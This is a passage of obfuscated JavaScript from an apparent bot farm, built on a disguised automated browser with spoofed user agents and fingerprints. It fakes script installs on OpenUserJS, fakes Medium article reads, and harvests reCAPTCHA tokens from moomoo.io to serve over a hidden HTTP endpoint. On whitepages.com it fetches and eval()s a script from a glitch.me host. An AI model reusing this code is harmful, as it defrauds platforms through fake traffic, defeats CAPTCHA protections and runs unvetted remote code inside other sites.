      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x3, 'l!jA') + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': Y(0x16) + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': Z(0x10) + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + Z(0x18) + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    X(0xc, 'C%TL') + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + X(0x1, 'C%TL') + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + Y(0xa) + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1d * 0x24 + -0x2257 + 0x1e43
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x9 * 0x43 + 0x97f + -0x724)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x4e9 + -0x1 * 0x1615 + -0x8c8 * -0x2), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x2af + -0x9 * 0x2ef + 0x181c), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x9d0 + -0x1 * 0x812 + 0xdf * -0x2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1c31 + 0x1421 + 0x158 * 0x6; w < getRandomInt(0x105a + -0x1de8 + 0xd8f, 0x166d * -0x1 + -0x1454 + 0x2ac6); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1a39 + 0x1c46a + -0x3d * 0x325);
        }
      }();
    }, -0x5d * 0x63 + 0x1 * -0x837 + 0x2c92), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x408 + -0x2249 * -0x1 + 0x1 * -0x2651;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1a53 + -0x1332 + -0x10f * -0x2b, 0x8df + 0x43c + 0x295 * -0x5)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x85a8 + -0x2ba * 0xb + 0x118d6);
    }, -0x24b9 + -0x1abd + -0x1fed * -0x2), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1 * -0x1bd1 + -0x1e52 + -0x1 * -0x281;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1b5c + 0x6 * -0x13f + -0x3b * -0xca), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xe4f + 0x21a4 + -0x2c3 * 0x7), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x12146 + 0x89ac8 + -0xdd5 * -0x4a);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1 * -0x15a6 + -0x22a * -0x1 + 0x13e0);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x11ab + -0x1f76 + -0x11f * -0xd);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1d4b * -0x1 + 0x9d8 + -0x5ab * -0x9);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = c,
    a1 = d,
    a0 = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x21 * -0x8d + -0x202a + -0xc96 * -0x4) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x9c7 + -0x3d + -0x989));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1a22 + -0x32 * 0x97 + 0x37a0, D['indexOf']('\x20'));
        return B ? E['slice'](-0x32e * -0x7 + -0x12aa + -0x398, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x293e + 0x3aba * -0x1 + 0x4 * 0x22c2),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1c5b + -0x1f * 0x4 + 0x43e7),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + a0(0x15, '*f7u') + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + a1(0xf) + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + a2(0x14) + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + a0(0x7, 'nj@K') + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
